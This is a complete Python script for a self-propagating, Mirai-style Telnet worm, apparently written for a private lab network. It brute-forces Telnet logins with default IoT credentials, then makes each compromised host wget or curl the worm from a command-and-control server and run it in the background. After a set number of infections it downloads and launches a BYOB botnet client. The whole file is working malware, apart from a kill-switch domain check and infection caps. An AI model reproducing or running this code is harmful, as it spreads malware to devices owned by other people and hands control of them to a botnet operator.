#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio
import logging
import random
import socket
import sys
import telnetlib3
import os

# GLOBAL CONFIGURATION
# Mirai C2 Server configuration
C2_IP_MIRAI = "10.170.0.101"
C2_URL_MIRAI = f"http://{C2_IP_MIRAI}/mirai.py"

# BYOB (Build Your Own Botnet) payload configuration
BYOB_SERVER_IP = C2_IP_MIRAI
BYOB_PAYLOAD_FILENAME = "client.py"
BYOB_PAYLOAD_URL = f"http://{BYOB_SERVER_IP}:446/clients/droppers/{BYOB_PAYLOAD_FILENAME}"
BYOB_PAYLOAD_PATH_TMP = f"/tmp/{BYOB_PAYLOAD_FILENAME}_downloaded"

# Kill switch domain
KILL_SWITCH_DOMAIN = "killswitch.com"

# Default credentials for Telnet brute-forcing
MIRAI_CREDS = [
    ("root", "vizxv"), ("root", "xc3511"), ("root", "admin"),
    ("admin", "admin"), ("root", "888888")
]
# Network ranges to scan for vulnerable hosts
NET_PREFIXES = ["10.150.0.", "10.151.0.", "10.152.0.", "10.153.0.", "10.154.0.", "10.160.0.",
                "10.161.0.", "10.162.0.", "10.163.0.", "10.164.0.", "10.170.0.", "10.171.0."]
HOST_IDS = range(71, 73)

# Worm behavior parameters
ROUND_INTERVAL = 10  # Seconds between infection rounds
TARGETS_PER_ROUND = 1
MAX_CONCURRENCY = 10
MAX_INFECT_PER_HOST_MIRAI = 2  # Max number of new hosts to infect before stopping
PROMPTS = (b"$", b"#", b">")

# Conditions to activate the secondary (BYOB) payload
MAX_SUCCESSFUL_MIRAI_INFECTIONS_FOR_BYOB = 2
MAX_CONSECUTIVE_MIRAI_FAILURES_FOR_BYOB = 15
BYOB_ACTIVATED_FLAG_FILE = "/tmp/.byob_activated_flag"  # Flag file to indicate activation

# Colored output configuration
CLR = dict(R="\033[31m", G="\033[32m", Y="\033[33m", C="\033[36m", RST="\033[0m")
c = lambda txt, col: CLR[col] + str(txt) + CLR["RST"]

# Logging setup
logging.basicConfig(
    level=logging.INFO,  # Can be set to logging.DEBUG for more verbose output
    format="%(asctime)s %(levelname)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

# UTILITY FUNCTIONS
async def wait_prompt(reader, timeout=5.0):
    """Waits for a shell prompt from the Telnet reader."""
    buf = b""
    while True:
        chunk = await asyncio.wait_for(reader.read(1024), timeout)
        if not chunk:
            raise EOFError("remote closed")
        buf += chunk
        if any(p in buf for p in PROMPTS):
            return buf

def get_self_ip() -> str:
    """Gets the IP address of the current host."""
    return socket.gethostbyname(socket.gethostname())

def random_targets(n, infected_hosts):
    """Selects n random targets, excluding self and already infected hosts."""
    self_ip = get_self_ip()
    pool = [
        f"{p}{i}" for p in NET_PREFIXES for i in HOST_IDS
        if f"{p}{i}" not in infected_hosts and f"{p}{i}" != self_ip
    ]
    n = min(n, len(pool))
    return random.sample(pool, n) if n else []

def progress_bar(done, total, width=30):
    """Displays a simple progress bar."""
    filled = int(done / total * width) if total else width
    return "[" + "#" * filled + "-" * (width - filled) + f"] {done}/{total}"

async def check_kill_switch():
    """Checks if the kill switch domain can be resolved."""
    check_cmd = f"dig +short {KILL_SWITCH_DOMAIN}"
    process = await asyncio.create_subprocess_shell(
        check_cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()

    if process.returncode == 0 and stdout.strip():
        resolved_ip = stdout.decode().strip()
        logging.warning(c(f"!!! Kill Switch domain '{KILL_SWITCH_DOMAIN}' resolved successfully to {resolved_ip}. Worm will terminate. !!!", "R"))
        return True
    else:
        logging.debug(f"Kill Switch domain '{KILL_SWITCH_DOMAIN}' could not be resolved. Continuing propagation.")
        return False

# BYOB PAYLOAD ACTIVATION
async def activate_byob_payload_on_host():
    """Downloads and executes the secondary BYOB payload on the current host."""
    if os.path.exists(BYOB_ACTIVATED_FLAG_FILE):
        logging.info(c(f"BYOB payload has already been activated on this host ({BYOB_ACTIVATED_FLAG_FILE} exists).", "Y"))
        return True

    logging.info(c(f"Attempting to download and execute BYOB payload from {BYOB_PAYLOAD_URL}", "C"))
    activated_successfully = False
    try:
        download_cmd = f"wget -q {BYOB_PAYLOAD_URL} -O {BYOB_PAYLOAD_PATH_TMP} || curl -s -f {BYOB_PAYLOAD_URL} -o {BYOB_PAYLOAD_PATH_TMP}"
        process_dl = await asyncio.create_subprocess_shell(
            download_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout_dl, stderr_dl = await process_dl.communicate()

        if process_dl.returncode == 0 and os.path.exists(BYOB_PAYLOAD_PATH_TMP):
            logging.info(c(f"BYOB payload downloaded successfully to {BYOB_PAYLOAD_PATH_TMP}", "G"))

            chmod_cmd = f"chmod +x {BYOB_PAYLOAD_PATH_TMP}"
            process_chmod = await asyncio.create_subprocess_shell(chmod_cmd)
            await process_chmod.communicate()
            if process_chmod.returncode != 0:
                logging.error(c(f"Failed to chmod {BYOB_PAYLOAD_PATH_TMP}, return code: {process_chmod.returncode}", "R"))
                return False

            run_cmd = f"nohup python3 {BYOB_PAYLOAD_PATH_TMP} > /dev/null 2>&1 &"
            await asyncio.create_subprocess_shell(run_cmd)
            logging.info(c(f"BYOB payload started in the background: {run_cmd}", "G"))
            with open(BYOB_ACTIVATED_FLAG_FILE, "w") as f:
                f.write(f"activated at {socket.gethostname()} on {os.uname()}")
            activated_successfully = True
        else:
            logging.error(c(f"Failed to download BYOB payload. Return code: {process_dl.returncode}", "R"))
            if stdout_dl: logging.error(f"Download STDOUT: {stdout_dl.decode(errors='ignore')}")
            if stderr_dl: logging.error(f"Download STDERR: {stderr_dl.decode(errors='ignore')}")

    except Exception as e:
        logging.error(c(f"An error occurred while activating BYOB payload: {type(e).__name__} - {e}", "R"))

    return activated_successfully

# TELNET WORM INFECTION
async def infect_mirai_on_target(ip):
    """Attempts to infect a target IP via Telnet using a list of credentials."""
    for user, pwd in MIRAI_CREDS:
        reader, writer = None, None
        try:
            logging.debug(f"Telnet: Attempting to connect to {ip} with user: {user}")
            reader, writer = await telnetlib3.open_connection(
                host=ip, port=23, shell=None,
                encoding=False, force_binary=True,
                connect_minwait=0.1, connect_maxwait=1.0)

            await reader.readuntil(b"login:")
            writer.write(user.encode() + b"\r\n")
            await reader.readuntil(b"Password:")
            writer.write(pwd.encode() + b"\r\n")
            await wait_prompt(reader)
            logging.debug(f"Telnet: Login successful on {ip} with user: {user}")

            # Send payload to propagate the worm
            cmds = [
                f"wget -q {C2_URL_MIRAI} -O /tmp/mirai.py || curl -s -f {C2_URL_MIRAI} -o /tmp/mirai.py",
                "chmod +x /tmp/mirai.py",
                "nohup python3 /tmp/mirai.py >/dev/null 2>&1 &",
                "exit",
            ]
            for cmd_idx, cmd_str in enumerate(cmds):
                logging.debug(f"Telnet: Executing command {cmd_idx+1}/{len(cmds)} on {ip}: {cmd_str}")
                writer.write(cmd_str.encode() + b"\r\n")
                if cmd_str.lower() != "exit":
                    await wait_prompt(reader)
                else:
                    await asyncio.sleep(0.5)

            logging.info(c(f"[+] Mirai successfully infected target {ip} ({user}/{pwd})", "G"))
            if writer and not writer.is_closing():
                writer.close()
            return True

        except (asyncio.TimeoutError, EOFError, ConnectionRefusedError, BrokenPipeError) as e:
            logging.warning(c(f"Telnet: Connection failed to {ip} ({user}): {type(e).__name__}", "Y"))
        except Exception as e_infect:
            logging.error(c(f"Telnet: An unexpected error occurred while infecting {ip} ({user}/{pwd}): {type(e_infect).__name__} - {e_infect}", "R"))
        finally:
            if writer and not writer.is_closing():
                writer.close()

    logging.info(c(f"[-] Mirai failed all credential attempts on target {ip}", "R"))
    return False

async def main():
    """Main execution loop for the Mirai worm."""
    sem = asyncio.Semaphore(MAX_CONCURRENCY)
    mirai_infected_targets = set()
    total_mirai_successes = 0
    consecutive_mirai_failures = 0
    mirai_propagation_active = True

    if os.path.exists(BYOB_ACTIVATED_FLAG_FILE):
        logging.info(c(f"BYOB has already been activated on this host. Mirai instance will exit.", "Y"))
        await activate_byob_payload_on_host() # Re-attempt activation just in case
        return

    round_num = 0
    while mirai_propagation_active:
        if await check_kill_switch():
            break

        # Check conditions for activating the secondary BYOB payload
        if total_mirai_successes >= MAX_SUCCESSFUL_MIRAI_INFECTIONS_FOR_BYOB or \
           consecutive_mirai_failures >= MAX_CONSECUTIVE_MIRAI_FAILURES_FOR_BYOB:
            logging.info(c(f"Condition to activate BYOB met: "
                           f"Successes {total_mirai_successes}/{MAX_SUCCESSFUL_MIRAI_INFECTIONS_FOR_BYOB} or "
                           f"Failures {consecutive_mirai_failures}/{MAX_CONSECUTIVE_MIRAI_FAILURES_FOR_BYOB}", "Y"))
            mirai_propagation_active = False
            await activate_byob_payload_on_host()
            break

        # Check if this instance has reached its infection quota
        if len(mirai_infected_targets) >= MAX_INFECT_PER_HOST_MIRAI:
            logging.info(c(f"This instance has reached its infection quota "
                           f"({len(mirai_infected_targets)}/{MAX_INFECT_PER_HOST_MIRAI}). "
                           f"Stopping Mirai scan and activating BYOB.", "Y"))
            mirai_propagation_active = False
            await activate_byob_payload_on_host()
            break

        remaining_quota = MAX_INFECT_PER_HOST_MIRAI - len(mirai_infected_targets)
        targets_for_this_round = random_targets(min(TARGETS_PER_ROUND, remaining_quota), mirai_infected_targets)

        if not targets_for_this_round:
            logging.info(c("No new Mirai targets available, waiting for next round...", "Y"))
            consecutive_mirai_failures += 1
            await asyncio.sleep(ROUND_INTERVAL)
            continue

        round_num += 1
        logging.info(c(f"\n=== Mirai Round {round_num} | Targets: {targets_for_this_round} ===", "C"))

        tasks_done_this_round = 0

        async def sem_infect_task(target_ip):
            nonlocal tasks_done_this_round, total_mirai_successes, consecutive_mirai_failures
            async with sem:
                success = await infect_mirai_on_target(target_ip)
                if success:
                    mirai_infected_targets.add(target_ip)
                    total_mirai_successes += 1
                    consecutive_mirai_failures = 0
                else:
                    consecutive_mirai_failures += 1
                tasks_done_this_round += 1
                print(progress_bar(tasks_done_this_round, len(targets_for_this_round)), end="\r")

        await asyncio.gather(*(sem_infect_task(t) for t in targets_for_this_round))
        print()  # Newline for progress bar
        logging.info(f"Mirai Round {round_num} finished. Total successes by this instance: {total_mirai_successes}, "
                     f"Consecutive failures: {consecutive_mirai_failures}")
        await asyncio.sleep(ROUND_INTERVAL)

    logging.info(c("Mirai propagation loop has ended.", "Y"))
    if not os.path.exists(BYOB_ACTIVATED_FLAG_FILE):
        logging.info(c("Attempting to activate BYOB payload...", "Y"))
        await activate_byob_payload_on_host()

    logging.info(c("Mirai worm script main task finished. The BYOB payload (if successful) should now be in control.", "C"))

if __name__ == "__main__":
    asyncio.run(main())